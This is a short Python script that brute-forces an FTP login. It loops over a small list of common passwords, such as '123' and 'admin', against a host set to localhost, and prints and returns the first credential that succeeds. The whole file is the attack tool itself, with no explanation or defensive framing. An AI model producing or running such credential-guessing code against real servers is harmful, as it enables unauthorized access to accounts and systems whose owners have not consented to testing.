from ftplib import FTP

def attempt_ftp_login(host, username, password):
    try:
        ftp = FTP(host)
        ftp.login(username, password)
        print(f"Login successfully {username}:{password}")
        ftp.quit()
        return True
    except Exception as e:
        print(f"Login failed {username}:{password}, Error: {str(e)}")
        return False

def crack_password(host, username, passwords):
    for password in passwords:
        if attempt_ftp_login(host, username, password):
            return password

host = 'localhost'
username = 'user'
passwords = ['123', 'admin', 'password', 'testing']
crack_password(host, username, passwords)

